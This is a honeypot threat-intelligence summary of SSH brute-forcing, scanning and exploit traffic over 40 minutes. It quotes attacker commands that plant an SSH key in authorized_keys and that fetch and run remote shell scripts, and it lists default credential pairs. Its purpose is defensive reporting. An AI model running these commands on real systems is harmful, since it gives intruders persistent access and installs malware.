**Honeypot Attack Summary Report**

**Report Generation Time:** 2025-10-18T02:01:31Z
**Timeframe Covered:** 2025-10-18T01:20:00Z to 2025-10-18T02:00:00Z
**Log Files Used:**
- agg_log_20251018T012001Z.json
- agg_log_20251018T014001Z.json
- agg_log_20251018T020001Z.json

---

### **Executive Summary**

This report summarizes 10,401 malicious events detected by the honeypot network over a 40-minute period. The majority of attacks were captured by the Cowrie (SSH/Telnet) honeypot. A significant portion of the activity originated from the IP address 72.146.232.13. Attackers predominantly targeted port 22 (SSH) and engaged in brute-force login attempts and reconnaissance commands. A notable command involved attempts to add a malicious SSH public key to the `authorized_keys` file for persistent access. Several network security signatures were triggered, with traffic from known malicious sources being the most common.

---

### **Detailed Analysis**

**Attacks by Honeypot:**
- Cowrie: 4208
- Honeytrap: 2534
- Ciscoasa: 1462
- Suricata: 1235
- Sentrypeer: 235
- Dionaea: 426
- H0neytr4p: 84
- Mailoney: 69
- Tanner: 45
- Miniprint: 27
- Dicompot: 25
- Adbhoney: 12
- Honeyaml: 16
- ConPot: 8
- ElasticPot: 7
- Redishoneypot: 6
- Heralding: 1
- Ipphoney: 1

**Top Attacking IPs:**
- 72.146.232.13: 861
- 47.97.127.96: 1244
- 119.14.0.26: 375
- 45.129.185.4: 250
- 151.44.169.133: 188
- 124.70.223.123: 166
- 107.170.36.5: 233
- 34.57.181.41: 204
- 211.24.41.44: 179
- 154.92.19.175: 153
- 40.115.18.231: 124

**Top Targeted Ports/Protocols:**
- 22: 847
- 445: 375
- 5060: 235
- 5903: 198
- 443: 84
- 8333: 76
- 5901: 104
- 25: 69
- 5905: 76
- 5904: 76
- TCP/80: 56
- 80: 37

**Most Common CVEs:**
- CVE-2024-3721
- CVE-2019-11500
- CVE-2002-0013
- CVE-2002-0012
- CVE-2001-0414
- CVE-1999-0517
- CVE-1999-0183

**Commands Attempted by Attackers:**
- `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ... mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`
- `rm -rf /data/local/tmp; mkdir -p /data/local/tmp; ... wget ... sh w.sh`
- `cd ~; chattr -ia .ssh; lockr -ia .ssh`
- `cat /proc/cpuinfo | grep name | wc -l`
- `free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'`
- `uname -a`
- `whoami`
- `lscpu | grep Model`
- `df -h`
- `crontab -l`
- `top`
- `w`

**Signatures Triggered:**
- ET DROP Dshield Block Listed Source group 1
- ET SCAN NMAP -sS window 1024
- ET SCAN MS Terminal Server Traffic on Non-standard Port
- ET INFO Reserved Internal IP Traffic
- ET INFO CURL User Agent
- ET DROP Spamhaus DROP Listed Traffic Inbound
- ET CINS Active Threat Intelligence Poor Reputation IP

**Users / Login Attempts:**
- 345gs5662d34/345gs5662d34
- supervisor/supervisor2008
- centos/centos111
- root/55555
- root/123.com.cn
- root/Password12345
- centos/1qaz2wsx
- ubnt/ubnt123456
- user/user2011
- root/Qaz123qaz

**Files Uploaded/Downloaded:**
- fonts.gstatic.com
- css?family=Libre+Franklin...
- ie8.css?ver=1.0
- html5.js?ver=3.7.3
- wget.sh
- w.sh
- c.sh

**HTTP User-Agents:**
- (No data)

**SSH Clients:**
- (No data)

**SSH Servers:**
- (No data)

**Top Attacker AS Organizations:**
- (No data)

---

### **Key Observations and Anomalies**

- **Persistent Access Attempts:** The most critical command observed was an attempt to add an attacker's SSH public key to the `authorized_keys` file. This is a clear attempt to establish persistent, passwordless access to the compromised machine.
- **Credential Stuffing:** A wide variety of common and default usernames and passwords were used, indicating large-scale, automated brute-force attacks.
- **Reconnaissance:** Attackers frequently ran commands like `uname -a`, `lscpu`, and `cat /proc/cpuinfo` to gather system information, likely to tailor further attacks or determine if the environment is a sandbox.
- **High Volume Scanning:** The prevalence of "NMAP" and "MS Terminal Server Traffic on Non-standard Port" signatures indicates widespread scanning activity to identify open ports and vulnerable services.
- **Coordinated Attack Infrastructure:** The `wget` command attempting to download and execute shell scripts (`w.sh`, `c.sh`) from a specific IP (213.209.143.167) suggests the use of a centralized command-and-control server to deploy malware.
